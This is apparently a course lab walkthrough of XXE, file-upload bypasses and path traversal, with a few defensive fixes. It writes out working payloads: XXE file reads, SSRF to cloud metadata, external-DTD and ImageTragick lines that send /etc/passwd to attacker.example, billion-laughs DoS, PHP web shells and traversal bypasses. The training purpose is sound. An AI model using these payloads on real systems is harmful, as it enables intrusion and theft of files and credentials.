# Week 12: Attack walkthrough — XXE, File Upload, Path Traversal

> ⚠️ **Lab only.**

---

## Part 1: XML External Entity (XXE)

### The pattern

The XML standard supports "entities" — references that the parser resolves and inlines:

```xml
<!DOCTYPE foo [<!ENTITY hi "Hello">]>
<root>&hi; world</root>
```

After parsing: `<root>Hello world</root>`. Fine.

The dangerous variant is **external entities** — the entity value is a URL that the parser fetches and inlines:

```xml
<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<root>&x;</root>
```

A vulnerable parser reads `/etc/passwd` from disk and inlines its contents.

### Step 1: Find an XML endpoint

Any endpoint that accepts XML:

- SOAP services
- RSS / Atom feed imports
- DOCX / SVG / EPUB uploads (all XML-based formats)
- Configuration-import features
- SAML SSO responses
- XMLRPC endpoints
- Anything that says "Content-Type: application/xml" or "text/xml"

### Step 2: Confirm XXE — fetch a file

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<root>&x;</root>
```

Submit. If the response includes the contents of `/etc/passwd`, XXE is confirmed.

PortSwigger's "Exploiting XXE to retrieve files" lab.

### Step 3: Pivot to SSRF

The same `SYSTEM` URL can be HTTP:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&x;</root>
```

Server fetches AWS metadata. You've turned XXE into the Week 08 SSRF chain.

PortSwigger's "XXE to perform SSRF" lab.

### Step 4: Blind XXE (when the response doesn't return)

Most modern XML parsers, even when they process external entities, don't echo them back in the response. To detect blind XXE, use OAST:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY x SYSTEM "http://YOUR-COLLABORATOR.burpcollaborator.net">]>
<root>&x;</root>
```

If your Collaborator gets a hit, XXE confirmed even without seeing the data.

### Step 5: Blind XXE with data exfiltration

To leak file contents even when the response is silent, use a 2-step "external DTD" attack:

Host this on your server (`http://attacker.example/evil.dtd`):

```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.example/?d=%data;'>">
%param1;
```

Then send to target:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % evil SYSTEM "http://attacker.example/evil.dtd"> %evil;]>
<root>&exfil;</root>
```

Parser:
1. Fetches your DTD.
2. The DTD defines `data` as the contents of `/etc/passwd`.
3. The DTD defines `exfil` as a URL containing `%data;`.
4. Parser fetches that URL — your server receives `/etc/passwd` contents in the query string.

PortSwigger's "Blind XXE with out-of-band interaction with parameter entities" lab.

### Step 6: Billion laughs (DoS)

Not RCE, but a famous XML attack:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  ...
]>
<root>&lol9;</root>
```

The expansion produces a billion-byte string from a few hundred bytes. The parser OOMs.

Many parsers cap expansion size by default in 2026. Older ones don't.

### Step 7: XXE in non-XML formats

Several formats are XML under the hood:

| Format | Underlying |
|---|---|
| DOCX, XLSX, PPTX | Zip containing XML files |
| SVG | XML |
| EPUB | Zip + XML |
| OpenDocument (ODT, ODS) | Zip + XML |
| SAML responses | XML |
| RSS, Atom | XML |
| XML-RPC | XML |
| Java JAR signatures | XML |

A file-upload endpoint that processes any of these is potentially an XXE entry point. Upload an SVG with an XXE payload; the rendering pipeline fetches the file you specified.

## Part 2: File upload — bypass the validators

### The goal

Upload a file the server will execute or expose in a way the attacker can leverage:

- Web shell (`.php`, `.aspx`, `.jsp`) executed by the web server
- File overwrite (replace a CSS/JS file the server serves)
- File that an internal processor mishandles (ImageMagick exploit, archive parser zip-slip)

### Layer 1: Extension check

```python
if not filename.endswith(".jpg"):
    reject()
```

Bypasses:

- **Double extension:** `shell.php.jpg` — passes the `.jpg` check, executes as PHP if the server is misconfigured to use the first matching extension
- **Null byte (legacy):** `shell.php%00.jpg` — in older PHP, the null byte terminated the string for filesystem write but not for the extension check
- **Case:** `shell.PhP` — case-insensitive filter required
- **Alternative extensions:** `.phtml`, `.php5`, `.pht`, `.shtml` all execute as PHP in default configs

### Layer 2: Content-Type check

```python
if request.files["upload"].content_type != "image/jpeg":
    reject()
```

The Content-Type header is **set by the client**. Just lie:

```http
Content-Type: image/jpeg

<?php system($_GET['c']); ?>
```

PortSwigger's "Content-Type restriction bypass" lab is this.

### Layer 3: Magic-byte check

```python
def is_jpeg(file):
    return file.read(3) == b"\xff\xd8\xff"
```

Bypass: prepend the magic bytes:

```
\xff\xd8\xff
<?php system($_GET['c']); ?>
```

Now the file looks like a JPEG to the validator and like PHP to the interpreter. The file is a **polyglot** — valid in two formats simultaneously.

This is why magic-byte checks don't prevent web-shell uploads if the file is later executed by name.

### Layer 4: Image-libraries-only

A server that re-encodes uploaded images through Pillow / ImageMagick / GraphicsMagick should strip the polyglot — the re-encode produces a clean image and discards the trailing PHP.

**Unless** the image library has its own bugs (Image Tragick), in which case re-encoding can itself be RCE.

### Step 5: Image Tragick (ImageMagick)

ImageMagick's MVG and MSL formats let an attacker specify drawing commands — including reading and writing arbitrary files:

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.example/?$(cat /etc/passwd))'
pop graphic-context
```

A file named `image.mvg` (or with magic bytes faking SVG) that ImageMagick processes triggers the command. CVE-2016-3714 was the first wave; new variants surface periodically.

Defense: disable risky coders in ImageMagick's `policy.xml`:

```xml
<policy domain="coder" rights="none" pattern="EPHEMERAL" />
<policy domain="coder" rights="none" pattern="URL" />
<policy domain="coder" rights="none" pattern="HTTPS" />
<policy domain="coder" rights="none" pattern="MVG" />
<policy domain="coder" rights="none" pattern="MSL" />
<policy domain="coder" rights="none" pattern="TEXT" />
<policy domain="coder" rights="none" pattern="SHOW" />
<policy domain="coder" rights="none" pattern="WIN" />
<policy domain="coder" rights="none" pattern="PLT" />
```

Most modern distributions ship this policy by default.

### Step 6: Upload destination matters

Even a valid PHP shell uploaded somewhere does nothing unless the server executes it. The shell needs to:

- Be in a directory that the web server serves AND configured to execute PHP
- Have an accessible URL
- Survive any post-upload processing (resizing, virus scanning)

Common vulnerable patterns:

- Avatar uploads stored in `/var/www/html/uploads/` directly
- "Tmp file" approach where the file exists at a predictable path before processing
- Storage with execution enabled (S3 bucket configured to serve as a static site, with `.html` files inadvertently executing)

### Step 7: The XXE-via-upload chain

Upload an SVG (which is XML):

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

Server's SVG renderer (rsvg, librsvg, ImageMagick) parses the XML, processes external entities, dumps `/etc/passwd` into the rendered output. The "rendered" image, when downloaded, contains the file contents as text.

## Part 3: Path traversal

### The pattern

```python
def get_file(filename):
    return open(f"/uploads/{filename}").read()
```

If `filename = "../../etc/passwd"`, the open path becomes `/uploads/../../etc/passwd` → `/etc/passwd`. File read of arbitrary host paths.

### Step 1: Find it

Any feature that takes a filename, path, or identifier and uses it on the filesystem:

- `?file=` parameters in download endpoints
- Filename in path: `/api/files/{filename}`
- Avatar URL pointing at server-side resources
- Internal "include this template" features
- Logging features that write to a configurable path

### Step 2: The basic payload

```
?file=../../../etc/passwd
?file=../../../../etc/passwd
?file=../../../../../etc/passwd  ← keep adding dots until you reach the root
```

On Windows:

```
?file=..\..\..\..\Windows\win.ini
?file=..%2F..%2F..%2FWindows%2Fwin.ini
```

### Step 3: Filter bypasses

| Filter | Bypass |
|---|---|
| Strips `../` | `....//` (after the first `../` is stripped, the second pair remains) |
| Strips `..` | `..%2f`, `..%252f` (double URL-encoded) |
| Adds an extension (`.png`) | Null byte: `../../etc/passwd%00.png` (legacy) |
| Allow-lists extension | `../../etc/passwd.png` doesn't exist, but `../../etc/passwd` does — depends on whether app does substring or exact-match |
| Requires path under `/var/www/uploads/` | `/var/www/uploads/../../../etc/passwd` |
| Strips backslashes | Use forward slashes on Windows (Windows accepts both) |

The PortSwigger lab catalog has each bypass.

### Step 4: Zip slip — archive extraction traversal

When an app extracts an uploaded zip:

```python
with ZipFile(uploaded_file) as z:
    for name in z.namelist():
        z.extract(name, target_dir)  # vulnerable
```

The zip's entries can have paths like `../../etc/cron.d/evil`. `extract` writes to whatever path the entry specifies. The attacker writes outside `target_dir`.

The fix is to validate paths before extracting:

```python
import os
def safe_extract(z, target_dir):
    for name in z.namelist():
        target = os.path.realpath(os.path.join(target_dir, name))
        if not target.startswith(os.path.realpath(target_dir) + os.sep):
            raise BadArchive
    z.extractall(target_dir)
```

Snyk's [Zip Slip writeup](https://snyk.io/research/zip-slip-vulnerability) catalogs the affected libraries (most major frameworks had the bug at some point).

### Step 5: Path traversal via cloud storage URLs

Modern apps store uploads in S3/GCS. Sometimes file URLs include the storage path:

```
https://example.com/files/?key=uploads/2026/05/22/abc.png
```

If the server constructs the actual storage key by concatenation, traversal-style payloads reach other prefixes:

```
?key=../../../private-backups/2025-12-31.sql
```

S3 keys are essentially paths; `../` is a normal character but applications may interpret it as path traversal.

## Common mistakes when learning

- **Stopping at file disclosure for XXE.** Pivot to SSRF, blind XXE, billion-laughs.
- **Not testing every upload destination.** A file landing in storage but processed by an internal worker is still an attack surface.
- **Forgetting double encoding** for path traversal — `..%252f` decodes to `..%2f` then to `../` if there are two decode passes.
- **Trusting MIME types from the client.** They're sent by the client; the server has to verify content.
- **Treating SVG as "just images."** They're XML, fully scriptable, full XXE surface.

Now read [defense.md](defense.md).
